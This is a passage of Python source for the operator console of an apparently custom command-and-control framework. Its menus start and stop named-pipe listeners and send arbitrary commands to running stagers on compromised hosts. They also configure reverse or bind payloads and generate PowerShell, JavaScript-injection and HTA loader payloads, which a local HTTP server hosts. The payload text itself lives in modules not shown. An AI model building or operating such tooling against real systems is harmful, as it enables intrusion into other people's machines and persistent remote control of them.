                    continue

            if cmd_tag == self.__t_myconstant.TAG_PIPE_LISTENER:
                # menu switch
                if command_id == self.__t_myconstant.CMD_BACK:
                    cmd_tag = self.__t_myconstant.TAG_MYCS
                    continue
                if command_id == self.__t_myconstant.CMD_PIPE_LISTENER_GETINFO:
                    self.__t_myserver.print_pipe_info()
                    continue
                if command_id == self.__t_myconstant.CMD_PIPE_LISTENER_START:
                    threading.Thread(target=self.__t_myserver.start_pipe_listener).start()
                    continue
                
                if command_id == self.__t_myconstant.CMD_PIPE_LISTENER_SETPIPENAME:
                    removecomplete()
                    user_input_pipename = input("Please enter the pipename: ")
                    self.__t_myserver.set_pipename(user_input_pipename)
                    continue
                if command_id == self.__t_myconstant.CMD_PIPE_LISTENER_STOP:
                    #set auto compete to listener uuid
                    setautocomplete(self.__t_myserver.get_pipe_listener())
                    user_input_listener = input("Please enter the listener uuid: ")
                    if user_input_listener not in self.__t_myserver.get_pipe_listener():
                        print("Please input a valid listener uuid")
                        continue
                    self.__t_myserver.stop_pipe_listener(user_input_listener)
                    continue
                if command_id == self.__t_myconstant.CMD_PIPE_LISTENER_LIST:
                    self.__t_myserver.print_pipe_listener()
                    continue

            if cmd_tag == self.__t_myconstant.TAG_PIPE_INTE_STAGER:
                #menu switch
                if command_id == self.__t_myconstant.CMD_BACK:
                    cmd_tag = self.__t_myconstant.TAG_MYCS
                    continue
                if command_id == self.__t_myconstant.CMD_PIPE_STAGER_GET_LIST:
                    self.__t_myserver.print_pipe_stager()
                    continue
                if command_id == self.__t_myconstant.CMD_PIPE_STAGER_GET_INTO:
                    #set auto compete to stager uuid
                    setautocomplete(self.__t_myserver.get_running_pipe_stager())

                    user_input_stager = input("Please enter the stager uuid: ")
                    if user_input_stager not in self.__t_myserver.get_running_pipe_stager():
                        print("Please input a valid stager uuid")
                        continue

                    #unset auto complete
                    removecomplete()
                    user_input_command_tag = input("Please enter the command tag: ")
                    user_input_command = input("Please enter the command: ")
                    self.__t_myserver.create_pipe_command(user_input_stager,user_input_command_tag,user_input_command)
                    continue
                if command_id == self.__t_myconstant.CMD_PIPE_STAGER_GET_HISTORY:
                    #set auto compete to stager uuid
                    setautocomplete(self.__t_myserver.get_pipe_stager())

                    user_input_stager = input("Please enter the stager uuid: ")
                    if user_input_stager not in self.__t_myserver.get_pipe_stager():
                        print("Please input a valid stager uuid")
                        continue
                    for each_msg in self.__t_myserver.get_pipe_history()[user_input_stager]:
                        print(each_msg)
                    continue
                if command_id == self.__t_myconstant.CMD_PIPE_STAGER_GET_RUNNING_LIST:
                    self.__t_myserver.print_pipe_stager_running()
                    continue

                if command_id == self.__t_myconstant.CMD_PIPE_STAGER_CON:
                    #unset auto complete
                    removecomplete()
                    #get host and port
                    user_input_host = input("Please enter hostname or ip: ")
                    user_input_pipename = input("Please enter pipename: ")
                    self.__t_myserver.start_pipe_client(user_input_host,user_input_pipename)

            if cmd_tag == self.__t_myconstant.TAG_PAYLOAD:

                if command_id == self.__t_myconstant.CMD_BACK:
                    cmd_tag = self.__t_myconstant.TAG_MYCS
                    continue

                if command_id == self.__t_myconstant.CMD_PAYLOAD_INFO:
                    self.__t_mypayload.printinfo()
                    continue

                if command_id == self.__t_myconstant.CMD_PAYLOAD_SETCONFIG:
                    removecomplete()

                    print("============Empty inputs will be ignored=============")
                    user_input = input("Please enter ifreverse: ")
                    if (len(user_input) != 0):
                        if (user_input == "True" or user_input == "true"):
                            self.__t_mypayload.ifreverse = True
                        elif(user_input == "False" or user_input == "false"):
                            self.__t_mypayload.ifreverse = False
                        else:
                            pass
                    
                    user_input = input("Please enter payload type: ")
                    if (len(user_input) != 0):
                        if (user_input == "socket" or user_input == "namepipe"):
                            self.__t_mypayload.payloadtype = user_input
                        else:
                            print("Unknown type, value unchanged")

                    if self.__t_mypayload.payloadtype == "namepipe":
                        user_input = input("Please enter namepipe: ")
                        if (len(user_input) != 0):
                            self.__t_mypayload.namepipe = user_input
                        
                        user_input = input("Please enter namepipehost: ")
                        if (len(user_input) != 0):
                            self.__t_mypayload.namepipehost = user_input
                    
                    else:                        
                        user_input = input("Please enter host: ")
                        if (len(user_input) != 0):
                            self.__t_mypayload.host = user_input
                        
                        user_input = input("Please enter port: ")
                        if (len(user_input) != 0):
                            self.__t_mypayload.port = int(user_input)
                    
                    continue

                if command_id == self.__t_myconstant.CMD_PAYLOAD_GEN:
                    t_mypayloadgen = payloadgen.mypayloadgen()
                    if self.__t_mypayload.payloadtype == "socket":
                        t_mypayloadgen.set_config(self.__t_mypayload.payloadtype,self.__t_mypayload.ifreverse,self.__t_mypayload.host,self.__t_mypayload.port)
                    else:
                        t_mypayloadgen.set_config(self.__t_mypayload.payloadtype,self.__t_mypayload.ifreverse,self.__t_mypayload.namepipehost,self.__t_mypayload.namepipe)
                    t_mypayloadgen.gen_ps1()
                
                if command_id == self.__t_myconstant.CMD_PAYLOAD_GTOJS:
                    t_mypayloadgen = payloadgen.mypayloadgen()
                    #target of injection
                    user_input = input("Please enter injection target: ")
                    user_input_confirm = input("y to continue: ")
                    if user_input_confirm != "y":
                        continue

                    t_mypayloadgen.set_injection_target(user_input)

                    #config default payload
                    if self.__t_mypayload.payloadtype == "socket":
                        t_mypayloadgen.set_config(self.__t_mypayload.payloadtype,self.__t_mypayload.ifreverse,self.__t_mypayload.host,self.__t_mypayload.port)
                    else:
                        t_mypayloadgen.set_config(self.__t_mypayload.payloadtype,self.__t_mypayload.ifreverse,self.__t_mypayload.namepipehost,self.__t_mypayload.namepipe)
                    t_mypayloadgen.gen_gtojs()
                
                if command_id == self.__t_myconstant.CMD_PAYLOAD_PHTA:
                    print("============Empty inputs will be ignored=============")
                    user_input_ip = input("Please enter loader ip: ")
                    user_input_port = input("Please enter loader port: ")
                    user_input_filename = input("Please enter loader filename: ")
                    user_input_confirm = input("y to continue: ")
                    if user_input_confirm != "y":
                        continue
                    t_mypayloadgen = payloadgen.mypayloadgen()
                    t_mypayloadgen.set_pexec_config(user_input_filename,user_input_ip,user_input_port)
                    
                    #config default payload
                    if self.__t_mypayload.payloadtype == "socket":
                        t_mypayloadgen.set_config(self.__t_mypayload.payloadtype,self.__t_mypayload.ifreverse,self.__t_mypayload.host,self.__t_mypayload.port)
                    else:
                        t_mypayloadgen.set_config(self.__t_mypayload.payloadtype,self.__t_mypayload.ifreverse,self.__t_mypayload.namepipehost,self.__t_mypayload.namepipe)

                    t_mypayloadgen.gen_pexec_hta()

            if cmd_tag == self.__t_myconstant.TAG_LOCALSERVER:
                if command_id == self.__t_myconstant.CMD_BACK:
                    cmd_tag = self.__t_myconstant.TAG_MYCS
                    continue
                if command_id == self.__t_myconstant.CMD_LOCALSERVER_LIST:
                    self.__t_localhttpserver.print_running_list()
                    continue
                if command_id == self.__t_myconstant.CMD_LOCALSERVER_GETINFO:
                    self.__t_localhttpserver.print_server_config()
                    continue
                if command_id == self.__t_myconstant.CMD_LOCALSERVER_SETCONFIG:
                    print("============Empty inputs will be ignored=============")
                    user_input_ip = input("Please enter the listener ip: ")
                    user_input_port = input("Please enter the listener port: ")
                    user_input_path = input("Please enter the server path: ")
                    user_input_confirm = input("y to continue: ")
                    if user_input_confirm != "y":
                        continue
                    self.__t_localhttpserver.set_server_config(user_input_ip,user_input_port,user_input_path)
                    continue
                if command_id == self.__t_myconstant.CMD_LOCALSERVER_START:
                    self.__t_localhttpserver.start_resource_handler_http_server()
                if command_id == self.__t_myconstant.CMD_LOCALSERVER_STOP:
                    #set auto compete to stager uuid
                    setautocomplete(self.__t_localhttpserver.get_running_list())

                    user_input_stager = input("Please enter the stager uuid: ")
                    if user_input_stager not in self.__t_localhttpserver.get_running_list():
                        print("Please input a valid stager uuid")
                        continue
                    self.__t_localhttpserver.stop_resource_handler_http_server(user_input_stager)
                    continue


if __name__ == "__main__":

    t_mymainclass = mymainclass()
    t_mymainclass.main()
